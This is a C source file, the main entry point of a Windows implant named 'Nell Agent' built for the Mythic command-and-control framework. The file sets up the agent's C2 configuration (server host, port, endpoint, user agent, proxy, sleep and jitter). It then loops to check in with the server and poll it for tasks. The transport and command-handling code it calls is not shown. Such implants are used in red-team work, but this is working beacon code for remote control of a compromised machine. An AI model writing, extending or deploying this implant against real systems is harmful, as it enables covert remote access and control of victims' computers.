/**
 * Nell Agent - Main Entry Point
 * Mythic C2 Compatible Agent
 */

#include <windows.h>

#include "nell.h"
#include "config.h"
#include "Checkin.h"
#include "Transport.h"
#include "Command.h"

// Global config instance
PCONFIG_NELL nellConfig = NULL;

// Initialize agent configuration
BOOL InitConfig(VOID)
{
    nellConfig = (PCONFIG_NELL)LocalAlloc(LPTR, sizeof(CONFIG_NELL));
    if (!nellConfig)
        return FALSE;

    // Allocate mutable buffer for UUID (will be updated after checkin)
    nellConfig->agentID = (PCHAR)LocalAlloc(LPTR, 37);
    if (!nellConfig->agentID)
        return FALSE;
    memcpy(nellConfig->agentID, CONFIG_INIT_UUID, 36);
    nellConfig->agentID[36] = '\0';

    nellConfig->hostName = (PWCHAR)CONFIG_HOSTNAME;
    nellConfig->httpPort = CONFIG_PORT;
    nellConfig->endPoint = (PWCHAR)CONFIG_ENDPOINT;
    nellConfig->userAgent = (PWCHAR)CONFIG_USERAGENT;
    nellConfig->httpMethod = (PWCHAR)CONFIG_HTTP_METHOD;
    nellConfig->isSSL = CONFIG_SSL;
    nellConfig->isProxyEnabled = CONFIG_PROXY_ENABLED;
    nellConfig->proxyURL = (PWCHAR)CONFIG_PROXY_URL;
    nellConfig->sleeptime = CONFIG_SLEEP_TIME;
    nellConfig->jitter = CONFIG_JITTER;

    srand(GetTickCount()); // Seed PRNG for jitter

    return TRUE;
}

// Main agent loop
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Initialize config
    if (!InitConfig())
        return 1;

    // Checkin loop - retry until success
    while (!DoCheckin())
    {
        Sleep(nellConfig->sleeptime * 1000);
    }

    // Main tasking loop
    while (TRUE)
    {
        // Ask for tasks and handle responses
        if (!routine())
        {
            // If routine fails (e.g. transport error), back off
            // Note: routine() itself handles success sleep, so we only sleep here on failure if needed
            // But routine() in Command.c currently returns TRUE almost always.
            // If it returned FALSE, we should sleep.
            Sleep(nellConfig->sleeptime * 1000);
        }
        
        // routine() implementation in Command.c includes a Sleep() at the end.
    }

    return 0;
}

// Optional: Console entry point for debugging
#ifdef DEBUG_BUILD
int main(int argc, char* argv[])
{
    return WinMain(GetModuleHandle(NULL), NULL, NULL, SW_SHOW);
}
#endif
